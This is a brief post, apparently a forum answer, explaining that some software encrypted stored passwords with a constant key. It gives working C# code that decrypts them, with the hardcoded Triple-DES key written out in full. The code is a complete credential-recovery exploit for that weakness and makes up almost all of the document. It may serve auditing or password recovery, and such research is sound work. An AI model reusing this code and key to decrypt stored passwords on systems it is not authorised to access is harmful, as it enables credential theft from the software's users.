It used a constant key to encrypt passwords, so here's C# that will decrypt a password:

```csharp
string encryptedValue = args[0];
byte[] encryptedBytes = Convert.FromBase64String(encryptedValue);
byte[] keyBytes = Encoding.ASCII.GetBytes("0yJ!@1$r8p0L@r1$6yJ!@1rj");
Console.WriteLine(DecryptString(encryptedBytes, keyBytes));

string DecryptString(byte[] encryptedBytes, byte[] key)
{
    byte[] Results;
    System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();
    MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();
    TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();
    TDESAlgorithm.Key = key;
    TDESAlgorithm.Mode = CipherMode.ECB;
    TDESAlgorithm.Padding = PaddingMode.PKCS7;
    try
    {
        ICryptoTransform Decryptor = TDESAlgorithm.CreateDecryptor();
        Results = Decryptor.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);
    }
    finally
    {
        TDESAlgorithm.Clear();
        HashProvider.Clear();
    }
    return UTF8.GetString(Results);
}
```